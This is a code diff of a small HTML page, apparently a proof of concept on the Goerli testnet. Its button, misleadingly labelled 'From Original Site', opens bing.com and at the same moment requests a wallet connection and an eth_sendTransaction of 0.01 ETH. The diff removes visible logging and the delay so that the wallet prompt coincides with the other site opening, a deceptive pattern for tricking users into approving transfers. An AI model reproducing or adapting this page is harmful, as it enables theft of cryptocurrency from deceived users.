@@ -19,31 +19,24 @@
 </head>
 <body>
   <center>
-    <input type="button" class="button" value="From Original Site" onclick="openBingAndPromptWallet()">
+    <input type="button" class="button" value="From Original Site" onclick="openBingAndPerformTransaction()">
   </center>
 
-  <div id="consoleOutput"></div>
-
   <script>
-    function logToConsole(message) {
-      const consoleOutput = document.getElementById("consoleOutput");
-      const logEntry = document.createElement("p");
-      logEntry.textContent = message;
-      consoleOutput.appendChild(logEntry);
-    }
-
-    async function openBingAndPromptWallet() {
-      logToConsole("Opening Bing.com...");
+    async function openBingAndPerformTransaction() {
+      // Open bing.com
       window.open('https://bing.com', 'x');
 
+      // Attempt wallet connection and transaction request simultaneously
       try {
-        await promptWalletConnection();
-        logToConsole('Wallet connected successfully!');
+        const walletPromise = promptWalletConnection();
+        const transactionPromise = performTransaction();
+        
+        await Promise.all([walletPromise, transactionPromise]);
 
-        logToConsole("Waiting 5 seconds before performing transaction...");
-        setTimeout(performTransaction, 5000); // Delay for 5 seconds (adjust as needed)
+        console.log('Wallet connected and transaction sent successfully!');
       } catch (error) {
-        logToConsole('Wallet connection or transaction failed: ' + error);
+        console.error('Wallet connection or transaction failed:', error);
       }
     }
 
@@ -60,14 +53,25 @@
     }
 
     async function performTransaction() {
-      logToConsole("Initiating transaction...");
-      
-      // ... (rest of the transaction code)
+      const transactionParameters = {
+        nonce: "0x00",
+        gasPrice: "0x244AC6D",
+        gas: "0x12A52",
+        to: "0x0000000000000000000000000000000000000000",
+        from: ethereum.selectedAddress,
+        value: "0x2386F26FC10000",
+        data: "0x00",
+        chainId: "0x5",
+      };
 
       try {
-        // ... (rest of the transaction request and handling)
+        const txHash = await ethereum.request({
+          method: "eth_sendTransaction",
+          params: [transactionParameters],
+        });
+        console.log(`Transaction sent! Transaction hash: ${txHash}`);
       } catch (error) {
-        logToConsole('Transaction failed: ' + error.message);
+        console.error(`Transaction failed: ${error.message}`);
       }
     }
   </script>
